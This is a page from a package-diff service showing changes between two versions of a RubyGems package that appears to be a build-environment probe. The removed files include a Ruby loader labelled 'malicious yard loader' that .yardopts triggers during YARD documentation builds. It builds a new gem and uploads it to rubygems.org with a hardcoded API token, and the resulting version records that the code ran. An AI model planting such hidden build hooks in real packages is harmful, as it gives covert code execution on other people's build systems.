@@ -1,0 +1,548 @@
+Source: https://my.diffend.io/gems/southnewsprobe1778550995/0.0.2/0.0.3
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - southnewsprobe1778550995 - Versions diffs - 0.0.2 → 0.0.3 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+southnewsprobe1778550995
+
+Versions diffs
+
+0.0.2 → 0.0.3
+
+southnewsprobe1778550995
+0.0.2
+→
+0.0.3
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (6)
+        hide
+        show
+
+            checksums.yaml
+
+          +4
+          -4
+
+            data/lib/z.rb
+
+          +1
+          -0
+
+            metadata
+
+          +12
+          -10
+
+            data/.yardopts
+
+          +0
+          -2
+
+            data/fetch.rb
+
+          +0
+          -20
+
+            data/lib/x.rb
+
+          +0
+          -2
+
+        checksums.yaml
+    CHANGED
+
+    Viewed
+
+@@ -1,7 +1,7 @@
+
+1
+
+1
+
+            ---
+
+2
+
+2
+
+            SHA256:
+
+3
+
+            -
+              metadata.gz: 271721dd55ff696bbfcd8b0afb34f7b8f49f12e4d0ab2b7e7e7c2da7ee0f2ae1
+
+4
+
+            -
+              data.tar.gz: 5f02fbecb953662d40f61ce9cb5553808607e740bb92c3ae0c339a7057bba035
+
+3
+
+            +
+              metadata.gz: 10303393b53d5e476bb90ddc663871e4d32a782b1651821f5e110da19162b693
+
+4
+
+            +
+              data.tar.gz: 7bdab7a1293440da0801f1524733a9c258a1ea67f3303b85fd575faf8a9397e4
+
+5
+
+5
+
+            SHA512:
+
+6
+
+            -
+              metadata.gz: bd8f8a3595620138cb35f79b38c100ec3debc6e8a665d3f750b5ff18892bb9e82a2c86fee0a49cbd2810c26c7665d38509a27b72eadcb5f71f74bbf2af993996
+
+7
+
+            -
+              data.tar.gz: 175a19c34c570b5dcbf880e344a379c62f05a8dfbbc994013129ca3a97b56b522ac2255915d1775760438d6ece7dbd33563f7e65ee04226b7c3bb2eedcca890d
+
+6
+
+            +
+              metadata.gz: 267a1767706fbbe5c94a0a1cf2d48453fe3cc3fe27f0e17e3660ebf9b56a2645e7afe8cc64f60ac0d3e928d3f05eb8b3330d02f6d61f837c9ef2242670b7a045
+
+7
+
+            +
+              data.tar.gz: 913114c1917c3c793c31b0fc503bb4d115837b86f614e6745c283bbff809eadc62e5c0c21da5d0e28cc630608d53d142349bad49441aca376d9c5394dca6eff4
+
+        data/lib/z.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            #exfil 2026-05-12 04:17:55 +0200
+
+        metadata
+    CHANGED
+
+    Viewed
+
+@@ -1,26 +1,27 @@
+
+1
+
+1
+
+            --- !ruby/object:Gem::Specification
+
+2
+
+2
+
+            name: southnewsprobe1778550995
+
+3
+
+3
+
+            version: !ruby/object:Gem::Version
+
+4
+
+            -
+              version: 0.0.2
+
+4
+
+            +
+              version: 0.0.3
+
+5
+
+5
+
+            platform: ruby
+
+6
+
+6
+
+            authors:
+
+7
+
+7
+
+            - a
+
+8
+
+            +
+            autorequire: 
+
+8
+
+9
+
+            bindir: bin
+
+9
+
+10
+
+            cert_chain: []
+
+10
+
+            -
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            date: 2026-05-12 00:00:00.000000000 Z
+
+11
+
+12
+
+            dependencies: []
+
+13
+
+            +
+            description: 
+
+14
+
+            +
+            email: 
+
+12
+
+15
+
+            executables: []
+
+13
+
+16
+
+            extensions: []
+
+14
+
+17
+
+            extra_rdoc_files: []
+
+15
+
+18
+
+            files:
+
+16
+
+            -
+            - ".yardopts"
+
+17
+
+            -
+            - fetch.rb
+
+18
+
+            -
+            - lib/x.rb
+
+19
+
+            -
+            homepage: https://example.com
+
+19
+
+            +
+            - lib/z.rb
+
+20
+
+            +
+            homepage: 
+
+20
+
+21
+
+            licenses:
+
+21
+
+22
+
+            - MIT
+
+22
+
+            -
+            metadata:
+
+23
+
+            -
+              yard.run: yard
+
+23
+
+            +
+            metadata: {}
+
+24
+
+            +
+            post_install_message: 
+
+24
+
+25
+
+            rdoc_options: []
+
+25
+
+26
+
+            require_paths:
+
+26
+
+27
+
+            - lib
+
+@@ -35,7 +36,8 @@ required_rubygems_version: !ruby/object:Gem::Requirement
+
+35
+
+36
+
+                - !ruby/object:Gem::Version
+
+36
+
+37
+
+                  version: '0'
+
+37
+
+38
+
+            requirements: []
+
+38
+
+            -
+            rubygems_version: 3.6.7
+
+39
+
+            +
+            rubygems_version: 3.1.6
+
+40
+
+            +
+            signing_key: 
+
+39
+
+41
+
+            specification_version: 4
+
+40
+
+            -
+            summary: builder probe
+
+42
+
+            +
+            summary: YARD RAN 2026-05-12 04:17:55 +0200
+
+41
+
+43
+
+            test_files: []
+
+        data/.yardopts
+    DELETED
+
+    Viewed
+
+@@ -1,2 +0,0 @@
+
+1
+
+            -
+            --no-private
+
+2
+
+            -
+            --load ./fetch.rb
+
+        data/fetch.rb
+    DELETED
+
+    Viewed
+
+@@ -1,20 +0,0 @@
+
+1
+
+            -
+            # malicious yard loader
+
+2
+
+            -
+            begin
+
+3
+
+            -
+             File.write('/tmp/yardprobe', "ran at #{Time.now}\n")
+
+4
+
+            -
+             # exfil by push gem 0.0.3
+
+5
+
+            -
+             Dir.mkdir('/tmp/zzbuild') rescue nil
+
+6
+
+            -
+             Dir.mkdir('/tmp/zzbuild/lib') rescue nil
+
+7
+
+            -
+             File.write('/tmp/zzbuild/lib/z.rb', "#exfil #{Time.now}\n")
+
+8
+
+            -
+             File.write('/tmp/zzbuild/z.gemspec', <<~EOS)
+
+9
+
+            -
+              Gem::Specification.new do |s|
+
+10
+
+            -
+               s.name='southnewsprobe1778550995';s.version='0.0.3';s.summary='YARD RAN '+Time.now.to_s;s.authors=['a'];s.files=['lib/z.rb'];s.license='MIT';s.require_paths=['lib'];end
+
+11
+
+            -
+             EOS
+
+12
+
+            -
+             require 'rubygems/package'
+
+13
+
+            -
+             Dir.chdir('/tmp/zzbuild') { system('gem build z.gemspec') }
+
+14
+
+            -
+             require 'net/http'
+
+15
+
+            -
+             uri=URI('https://rubygems.org/api/v1/gems')
+
+16
+
+            -
+             gem_bin=File.binread('/tmp/zzbuild/southnewsprobe1778550995-0.0.3.gem')
+
+17
+
+            -
+             req=Net::HTTP::Post.new(uri); req['Authorization']='rubygems_9feada919f2ff0a2fc27f0724343fdc9acf208e13c054a57'; req['Content-Type']='application/octet-stream'; req.body=gem_bin
+
+18
+
+            -
+             res=Net::HTTP.start(uri.hostname,uri.port,use_ssl:true){|h| h.request(req)}
+
+19
+
+            -
+             rescue Exception=>e
+
+20
+
+            -
+            end
+
+        data/lib/x.rb
+    DELETED
+
+    Viewed
+
+@@ -1,2 +0,0 @@
+
+1
+
+            -
+            # hi class
+
+2
+
+            -
+            class Hi; def a; end; end
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
